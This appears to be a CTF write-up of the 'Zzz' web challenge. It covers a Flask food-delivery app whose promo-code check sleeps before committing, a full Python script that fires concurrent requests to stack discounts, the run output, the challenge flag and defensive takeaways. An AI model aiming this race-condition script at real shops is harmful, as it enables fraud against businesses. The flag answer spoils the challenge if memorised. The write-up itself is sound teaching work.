---
title: Zzz Challenge Writeup mojoJOJO CTF
description: A writeup for the web exploitation challenge named Zzz in MOJOJOJO CTF
author: Koussay Dhifi
categories: [Writeups, MOJOJOJO]
tags: [WebExploitation, CTFs, Race Conditions]
pin: true
math: true
mermaid: true
image: ../assets/img/mojojojo/mojoJOJO.jpg
---

## Introduction

This challenge is named Zzz and we are provided with both a hint and source code. The hint says: **Always stay awake — no time for naps.**

And we have a Flask app.

## Investigation

In this section we will do the recon and understand the business logic of the app.

### Manual Recon

First I always like to see what the app is about and then fill the missing pieces with the source code.

We have, as we can see, a food delivery website where you choose which restaurant you want to order from and then the delivery comes to you theoretically.

![WebsiteOfFoodDelivery](../assets/img/mojojojo/zzz/Pasted%20image.png)

When you click on a restaurant you get the menu and then you add it to cart but you need to have an account first.

![Menu](../assets/img/mojojojo/zzz/Pasted%20image%20(2).png)

So let's register with a username: koussay and a password: 123

When we log in we get new items in the navbar as shown in the image.

![NewNavbar](../assets/img/mojojojo/zzz/Pasted%20image%20(3).png)

When we add an item into the cart we can check the cart to order it and we can see that we have an input field for a promo code.

![Cart](../assets/img/mojojojo/zzz/Pasted%20image%20(4).png)

When we try to order it we have insufficient money.

So maybe the goal is to access the admin page — it's always the deal with these challenges — so let's check the source code to see where the flag is.

So I missed something xD turns out that the goal is basically to order the flag from The Hood restaurant (I hate that restaurant... maybe). So the goal is basically to have sufficient funds for the flag which costs 1000 TND (Inflation hits hard even in flags... dear 9ays why).

![Flag Item](../assets/img/mojojojo/zzz/Pasted%20image%20(5).png)

So the goal: Get a super cool promo code or have sufficient funds.

Let's check the source code — we may find something.

### Source Code

We can see the flag is there indeed:

```python
items = [
    {"name": "Cheeseburger", "price": 12.0, "desc": "Juicy beef patty with cheddar."},
    {"name": "Double Whopper", "price": 18.0, "desc": "Double beef, double cheese, all the fixings."},
    {"name": "Fries", "price": 5.0, "desc": "Crispy golden fries."},
    {"name": "Flag", "price": 1000.0, "desc": get_flag()}
]
```

After we check the source code we can see we have two promo codes. From what I understand I need to maybe manipulate the business logic to get the flag.

#### Promo Codes

We have two promo codes: `TRYIT20` and `FIDELE` — each gives us a 20% discount for the cart.

And we have:
```python
elif code == 'FIDELE':
    if payload.get('num_purchases') == 0:
        if current_user.promo_requested_fidele:
            flash('Promo code already applied to this cart!')
            return redirect(url_for('cart'))
        
        User.query.filter_by(id=current_user.id).update({'discount_percentage': User.discount_percentage + 0.20})
        
        db.session.expire(current_user)
        
        time.sleep(1)
        current_user.promo_requested_fidele = True
        db.session.commit()
        flash('Loyalty promo applied! 20% discount set.')
```

That `time.sleep(1)` is the key inshallah! We need to send enough requests in under 1 second to get full discount for the flag... we can do this using threading xDDDDDDDDDDDDD hehe boi let's do it.

```python
#!/usr/bin/env python3
"""
CTF Exploit: Race Condition in Promo Code Application

Vulnerability: The FIDELE promo code has a race condition due to:
1. Check-then-act pattern without locking
2. time.sleep(1) widens the exploitation window
3. Multiple requests can pass the check before any commits

Goal: Stack multiple 20% discounts to get the Flag item for free/cheap
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
TARGET_URL = "http://localhost:5002"  # Change to actual target
USERNAME = f"hacker_{int(time.time())}"
PASSWORD = "password123"

class Exploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
        
    def register(self):
        """Register a new user account"""
        print(f"[*] Registering user: {USERNAME}")
        resp = self.session.post(
            f"{self.base_url}/register",
            data={"username": USERNAME, "password": PASSWORD},
            allow_redirects=True
        )
        if resp.status_code == 200:
            print("[+] Registration successful")
            # Extract token from cookies
            self.token = self.session.cookies.get('token')
            if self.token:
                print(f"[+] Token obtained: {self.token[:30]}...")
            else:
                print("[!] Warning: No token in cookies after register")
            
            # Debug: print all cookies
            print(f"[DEBUG] Cookies: {list(self.session.cookies.keys())}")
            return True
        else:
            print(f"[-] Registration failed: {resp.status_code}")
            return False
    
    def login(self):
        """Login to get fresh token"""
        print(f"[*] Logging in as: {USERNAME}")
        resp = self.session.post(
            f"{self.base_url}/login",
            data={"username": USERNAME, "password": PASSWORD},
            allow_redirects=True
        )
        if resp.status_code == 200:
            self.token = self.session.cookies.get('token')
            print("[+] Login successful")
            print(f"[+] Token: {self.token[:20]}...")
            return True
        else:
            print(f"[-] Login failed: {resp.status_code}")
            return False
    
    def add_flag_to_cart(self):
        """Add the expensive Flag item to cart"""
        # The Flag is item ID 4 in "The Hood" restaurant (restaurant_id=1)
        # We need to find the actual item_id - try a few IDs
        print("[*] Adding Flag item to cart...")
        
        # Try item IDs 1-10 to find the flag
        for item_id in range(1, 11):
            resp = self.session.get(
                f"{self.base_url}/add_to_cart/{item_id}",
                allow_redirects=False
            )
            if "Flag" in resp.text or resp.status_code == 302:
                print(f"[+] Added item {item_id} to cart")
        
        return True
    
    def apply_promo_once(self, promo_code):
        """Single request to apply promo code"""
        try:
            resp = self.session.get(
                f"{self.base_url}/get_promo",
                params={"code": promo_code},
                allow_redirects=True,
                timeout=5
            )
            # Debug: print first response to see what we're getting
            if not hasattr(self, '_debug_printed'):
                print(f"\n[DEBUG] First response status: {resp.status_code}")
                print(f"[DEBUG] Response preview: {resp.text[:200]}...")
                self._debug_printed = True
            return resp.status_code, resp.text
        except Exception as e:
            return None, str(e)
    
    def race_condition_attack(self, promo_code="FIDELE", num_threads=10):
        """
        Exploit race condition by sending multiple simultaneous requests
        
        The time.sleep(1) in the code creates a 1-second window where
        multiple threads can pass the initial check before any commit
        """
        print(f"\n[*] Launching race condition attack with {num_threads} threads")
        print(f"[*] Target promo code: {promo_code}")
        print("[*] Exploiting the time.sleep(1) window...")
        
        results = {"success": 0, "already_applied": 0, "error": 0, "other": 0}
        
        def worker(thread_id):
            try:
                status, text = self.apply_promo_once(promo_code)
                if status == 200:
                    if "applied" in text.lower() and "already" not in text.lower():
                        print(f"[+] Thread {thread_id}: SUCCESS - Promo applied!")
                        return "success"
                    elif "already" in text.lower():
                        print(f"[-] Thread {thread_id}: Already applied")
                        return "already_applied"
                    else:
                        print(f"[-] Thread {thread_id}: Unexpected response")
                        return "other"
                else:
                    print(f"[-] Thread {thread_id}: HTTP {status}")
                    return "error"
            except Exception as e:
                print(f"[-] Thread {thread_id}: Exception - {str(e)[:50]}")
                return "error"
        
        # Launch all threads simultaneously
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker, i) for i in range(num_threads)]
            
            # Collect results
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result in results:
                        results[result] += 1
                    else:
                        results["other"] += 1
                except Exception as e:
                    print(f"[-] Future exception: {e}")
                    results["error"] += 1
        
        print(f"\n[*] Race condition results:")
        print(f"    Successful applications: {results['success']}")
        print(f"    Already applied responses: {results['already_applied']}")
        print(f"    Errors: {results['error']}")
        print(f"    Other: {results['other']}")
        
        return results['success']
    
    def check_cart(self):
        """Check current cart and discount"""
        print("\n[*] Checking cart status...")
        resp = self.session.get(f"{self.base_url}/cart")
        
        if "final_total" in resp.text.lower() or "discount" in resp.text.lower():
            # Parse the response to show discount info
            print("[+] Cart accessed successfully")
            if "0.0" in resp.text or "free" in resp.text.lower():
                print("[+] Discount applied! Check if total is near $0")
        return resp.text
    
    def purchase(self):
        """Attempt to purchase items in cart"""
        print("\n[*] Attempting purchase...")
        resp = self.session.get(
            f"{self.base_url}/purchase",
            allow_redirects=True
        )
        
        if "successfully" in resp.text.lower() or "delivery" in resp.text.lower():
            print("[+] Purchase successful!")
            return True
        elif "insufficient" in resp.text.lower():
            print("[-] Insufficient funds (need more discount)")
            return False
        else:
            print(f"[-] Purchase failed")
            return False
    
    def check_owned_items(self):
        """Check owned items to see if we got the flag"""
        print("\n[*] Checking owned items...")
        resp = self.session.get(f"{self.base_url}/my_items")
        print(resp.text)
        if "flag" in resp.text.lower() or "CTF{" in resp.text or "flag{" in resp.text.lower():
            print("[+] FLAG FOUND IN OWNED ITEMS!")
            print("\n" + "="*60)
            # Try to extract flag
            lines = resp.text.split('\n')
            for line in lines:
                if 'flag' in line.lower() or 'CTF' in line or 'FLAG' in line:
                    print(line.strip())
            print("="*60 + "\n")
            return True
        else:
            print("[-] Flag not in owned items yet")
        return False
    
    def full_exploit(self):
        """Complete exploitation chain"""
        print("\n" + "="*60)
        print("CTF EXPLOIT: Race Condition in Promo Code System")
        print("="*60 + "\n")
        
        # Step 1: Register
        if not self.register():
            print("[-] Registration failed")
            return False
        
        # Step 1.5: LOGIN to get JWT token with num_purchases=0
        print("\n[*] Logging in to get JWT token...")
        if not self.login():
            print("[-] Login failed")
            return False
        
        # Step 2: Add Flag item to cart
        self.add_flag_to_cart()
        
        # Step 3: Exploit race condition with FIDELE promo
        # The FIDELE promo checks num_purchases == 0 (new users qualify)
        # and has a time.sleep(1) making it easy to exploit
        successes = self.race_condition_attack(promo_code="FIDELE", num_threads=15)
        
        if successes < 2:
            print("\n[!] Race condition might not have worked well enough")
            print("[*] Trying again with more threads...")
            successes += self.race_condition_attack(promo_code="FIDELE", num_threads=20)
        
        # Step 4: Check cart to see discount
        self.check_cart()
        
        # Step 5: Try to purchase
        if self.purchase():
            # Step 6: Check if we got the flag
            self.check_owned_items()
            return True
        else:
            print("\n[!] Need more discount. Trying TRYIT20 promo as well...")
            # Try the other promo too
            self.apply_promo_once("TRYIT20")
            self.check_cart()
            if self.purchase():
                self.check_owned_items()
                return True
        
        return False


def main():
    print("""
╔═══════════════════════════════════════════════════════════╗
║         CTF Race Condition Exploit                        ║
║  Target: Promo Code System with time.sleep() vulnerability║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Change this to the actual target URL
    target = input(f"Enter target URL (default: {TARGET_URL}): ").strip()
    if not target:
        target = TARGET_URL
    
    exploit = Exploit(target)
    
    try:
        exploit.full_exploit()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
    except Exception as e:
        print(f"\n[-] Exploit failed with error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
```

And eventually we got the flag:

```sh
python3 script.py 

╔═══════════════════════════════════════════════════════════╗
║         CTF Race Condition Exploit                        ║
║  Target: Promo Code System with time.sleep() vulnerability║
╚═══════════════════════════════════════════════════════════╝
    
Enter target URL (default: http://localhost:5002): http://web-mojo.securinets.tn:5002 

============================================================
CTF EXPLOIT: Race Condition in Promo Code System
============================================================

[*] Registering user: hacker_1770577715
[+] Registration successful
[!] Warning: No token in cookies after register
[DEBUG] Cookies: ['session']

[*] Logging in to get JWT token...
[*] Logging in as: hacker_1770577715
[+] Login successful
[+] Token: eyJhbGciOiJIUzI1NiIs...
[*] Adding Flag item to cart...
[+] Added item 1 to cart
[+] Added item 2 to cart
[+] Added item 3 to cart
[+] Added item 4 to cart
[+] Added item 5 to cart
[+] Added item 6 to cart
[+] Added item 7 to cart
[+] Added item 8 to cart
[+] Added item 9 to cart
[+] Added item 10 to cart

[*] Launching race condition attack with 15 threads
[*] Target promo code: FIDELE
[*] Exploiting the time.sleep(1) window...

[DEBUG] First response status: 200
[DEBUG] Response preview: <!DOCTYPE html>
```
```html
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery App</title>
    <link href="https://f...

    <div class="card food-card">
            <div class="card-image" style="background-image: url('https://source.unsplash.com/200x200/?food');"></div>
            <div class="card-content">
                <h3>Flag</h3>
                <p class="description">MOJO-JOJO{erraaaaaaace_c0nd1tioon_ejjrriiii_L_waaa9t_chy0ufaa!!}
</p>
                <span class="price">Purchased</span>
            </div>
        </div>
```
```sh
[+] Thread 0: SUCCESS - Promo applied!
[+] Thread 9: SUCCESS - Promo applied!
[+] Thread 2: SUCCESS - Promo applied!
[-] Thread 1: HTTP None
[-] Thread 13: HTTP None
[-] Thread 6: HTTP None
[-] Thread 8: HTTP None
[-] Thread 3: HTTP None
[-] Thread 14: HTTP None
[-] Thread 10: HTTP None
[-] Thread 5: HTTP None
[-] Thread 4: HTTP None
[-] Thread 7: HTTP None
[-] Thread 12: HTTP None
[+] Thread 11: SUCCESS - Promo applied!

[*] Race condition results:
    Successful applications: 4
    Already applied responses: 0
    Errors: 11
    Other: 0

[*] Checking cart status...
[+] Cart accessed successfully
[+] Discount applied! Check if total is near $0

[*] Attempting purchase...
[+] Purchase successful!

[*] Checking owned items...
[+] FLAG FOUND IN OWNED ITEMS!

============================================================
<h3>Flag</h3>
============================================================
```

## Conclusion

So basically we exploited a race condition vulnerability in the promo code system. The `time.sleep(1)` in the FIDELE promo code created a perfect window for us to send multiple requests simultaneously before the database commit happened. By firing off 15-20 concurrent requests using threading, we managed to stack multiple 20% discounts on top of each other, bringing that expensive 1000 TND flag down to basically nothing.

The hint "Always stay awake — no time for naps" makes sense now — that `time.sleep(1)` was literally a "nap" in the code that we exploited. We stayed awake and sent our requests during that sleep window xD

Key takeaways:
- Race conditions happen when there's a gap between checking a condition and acting on it
- `time.sleep()` in production code is often a security vulnerability waiting to be exploited
- Threading/concurrent requests can abuse these timing windows
- Always use proper locking mechanisms when dealing with shared resources in multi-threaded environments
- The check-then-act pattern without atomic operations is dangerous

Flag: `MOJO-JOJO{erraaaaaaace_c0nd1tioon_ejjrriiii_L_waaa9t_chy0ufaa!!}`